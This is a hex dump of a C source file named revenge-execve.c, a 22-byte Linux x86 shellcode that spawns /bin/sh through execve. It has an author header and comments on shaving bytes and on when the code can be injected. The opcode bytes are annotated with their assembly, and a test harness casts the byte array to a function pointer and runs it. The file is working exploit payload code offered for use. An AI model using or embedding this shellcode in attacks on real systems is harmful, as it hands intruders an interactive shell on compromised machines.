00000000  2f 2a 0d 0a 20 2a 20 72  65 76 65 6e 67 65 2d 65  |/*.. * revenge-e|
00000010  78 65 63 76 65 2e 63 2c  20 76 31 2e 30 20 32 30  |xecve.c, v1.0 20|
00000020  30 36 2f 31 30 2f 31 34  20 31 36 3a 33 32 0d 0a  |06/10/14 16:32..|
00000030  20 2a 0d 0a 20 2a 20 59  65 74 20 61 6e 6f 74 68  | *.. * Yet anoth|
00000040  65 72 20 6c 69 6e 75 78  20 65 78 65 63 76 65 20  |er linux execve |
00000050  73 68 65 6c 6c 63 6f 64  65 2e 2e 0d 0a 20 2a 20  |shellcode.... * |
00000060  6c 69 6e 75 78 2f 78 38  36 20 65 78 65 63 76 65  |linux/x86 execve|
00000070  28 22 2f 62 69 6e 2f 2f  73 68 2f 22 2c 5b 22 2f  |("/bin//sh/",["/|
00000080  62 69 6e 2f 2f 73 68 22  5d 2c 4e 55 4c 4c 29 20  |bin//sh"],NULL) |
00000090  73 68 65 6c 6c 63 6f 64  65 0d 0a 20 2a 0d 0a 20  |shellcode.. *.. |
000000a0  2a 20 68 74 74 70 3a 2f  2f 77 77 77 2e 30 78 63  |* http://www.0xc|
000000b0  61 66 65 62 61 62 65 2e  69 74 0d 0a 20 2a 20 3c  |afebabe.it.. * <|
000000c0  20 72 65 76 65 6e 67 65  40 30 78 63 61 66 65 62  | revenge@0xcafeb|
000000d0  61 62 65 2e 69 74 20 3e  0d 0a 20 2a 0d 0a 20 2a  |abe.it >.. *.. *|
000000e0  20 42 75 74 20 74 68 69  73 20 74 69 6d 65 20 69  | But this time i|
000000f0  74 27 73 20 32 32 20 62  79 74 65 73 0d 0a 20 2a  |t's 22 bytes.. *|
00000100  0d 0a 20 2a 20 5b 20 57  65 20 63 6f 75 6c 64 20  |.. * [ We could |
00000110  73 74 61 72 74 20 74 68  65 20 73 68 65 6c 6c 63  |start the shellc|
00000120  6f 64 65 20 77 69 74 68  20 61 20 6d 6f 76 20 69  |ode with a mov i|
00000130  6e 73 74 65 61 64 20 6f  66 20 28 70 75 73 68 20  |nstead of (push |
00000140  2b 20 70 6f 70 29 20 65  61 78 20 20 5d 0d 0a 20  |+ pop) eax  ].. |
00000150  2a 20 5b 20 6f 62 74 61  69 6e 69 6e 67 20 74 68  |* [ obtaining th|
00000160  65 20 73 61 6d 65 20 72  65 73 75 6c 74 20 77 69  |e same result wi|
00000170  74 68 20 31 20 62 79 74  65 20 6c 65 73 73 2c 20  |th 1 byte less, |
00000180  62 75 74 20 69 66 20 77  65 20 68 61 64 20 73 6f  |but if we had so|
00000190  6d 65 74 68 69 6e 67 20  20 5d 0d 0a 20 2a 20 5b  |mething  ].. * [|
000001a0  20 77 72 6f 6e 67 20 69  6e 20 65 61 78 20 28 65  | wrong in eax (e|
000001b0  78 2e 20 2d 31 20 64 75  65 20 74 6f 20 61 6e 20  |x. -1 due to an |
000001c0  75 6e 63 6c 65 61 72 20  66 75 6e 63 74 69 6f 6e  |unclear function|
000001d0  20 65 78 69 74 29 20 77  65 20 63 61 6e 27 74 20  | exit) we can't |
000001e0  20 20 20 20 20 20 5d 0d  0a 20 2a 20 5b 20 69 6e  |      ].. * [ in|
000001f0  6a 65 63 74 20 69 74 20  20 20 20 20 20 20 20 20  |ject it         |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000230  20 20 20 5d 0d 0a 20 2a  0d 0a 20 2a 20 2a 2f 0d  |   ].. *.. * */.|
00000240  0a 0d 0a 63 68 61 72 20  73 63 5b 5d 20 3d 0d 0a  |...char sc[] =..|
00000250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000270  20 20 20 20 20 2f 2f 20  3c 5f 73 74 61 72 74 3e  |     // <_start>|
00000280  0d 0a 20 20 20 20 20 20  20 22 5c 78 62 30 5c 78  |..       "\xb0\x|
00000290  30 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |0b"             |
000002a0  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 20 20  |       // mov   |
000002b0  20 24 30 78 62 2c 25 61  6c 0d 0a 20 20 20 20 20  | $0xb,%al..     |
000002c0  20 20 22 5c 78 39 39 22  20 20 20 20 20 20 20 20  |  "\x99"        |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  2f 2f 20 63 6c 74 64 0d  0a 20 20 20 20 20 20 20  |// cltd..       |
000002f0  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000310  20 70 75 73 68 20 20 20  25 65 64 78 0d 0a 20 20  | push   %edx..  |
00000320  20 20 20 20 20 22 5c 78  36 38 5c 78 32 66 5c 78  |     "\x68\x2f\x|
00000330  32 66 5c 78 37 33 5c 78  36 38 22 20 20 20 20 20  |2f\x73\x68"     |
00000340  20 20 20 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |   // push   $0x|
00000350  36 38 37 33 32 66 32 66  0d 0a 20 20 20 20 20 20  |68732f2f..      |
00000360  20 22 5c 78 36 38 5c 78  32 66 5c 78 36 32 5c 78  | "\x68\x2f\x62\x|
00000370  36 39 5c 78 36 65 22 20  20 20 20 20 20 20 20 2f  |69\x6e"        /|
00000380  2f 20 70 75 73 68 20 20  20 24 30 78 36 65 36 39  |/ push   $0x6e69|
00000390  36 32 32 66 0d 0a 20 20  20 20 20 20 20 22 5c 78  |622f..       "\x|
000003a0  38 39 5c 78 65 33 22 20  20 20 20 20 20 20 20 20  |89\xe3"         |
000003b0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
000003c0  76 20 20 20 20 25 65 73  70 2c 25 65 62 78 0d 0a  |v    %esp,%ebx..|
000003d0  20 20 20 20 20 20 20 22  5c 78 35 32 22 20 20 20  |       "\x52"   |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003f0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000400  65 64 78 0d 0a 20 20 20  20 20 20 20 22 5c 78 35  |edx..       "\x5|
00000410  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3"              |
00000420  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000430  68 20 20 20 25 65 62 78  0d 0a 20 20 20 20 20 20  |h   %ebx..      |
00000440  20 22 5c 78 38 39 5c 78  65 31 22 20 20 20 20 20  | "\x89\xe1"     |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000460  2f 20 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |/ mov    %esp,%e|
00000470  63 78 0d 0a 20 20 20 20  20 20 20 22 5c 78 63 64  |cx..       "\xcd|
00000480  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000490  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
000004a0  20 20 20 24 30 78 38 30  0d 0a 3b 0d 0a 0d 0a 69  |   $0x80..;....i|
000004b0  6e 74 20 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 20 20  |nt main()..{..  |
000004c0  20 20 20 20 20 76 6f 69  64 20 20 20 20 28 2a 66  |     void    (*f|
000004d0  70 29 28 76 6f 69 64 29  20 3d 20 28 76 6f 69 64  |p)(void) = (void|
000004e0  20 28 2a 29 28 76 6f 69  64 29 29 73 63 3b 0d 0a  | (*)(void))sc;..|
000004f0  0d 0a 20 20 20 20 20 20  20 70 72 69 6e 74 66 28  |..       printf(|
00000500  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
00000510  74 72 6c 65 6e 28 73 63  29 29 3b 0d 0a 20 20 20  |trlen(sc));..   |
00000520  20 20 20 20 66 70 28 29  3b 0d 0a 7d              |    fp();..}|
0000052c
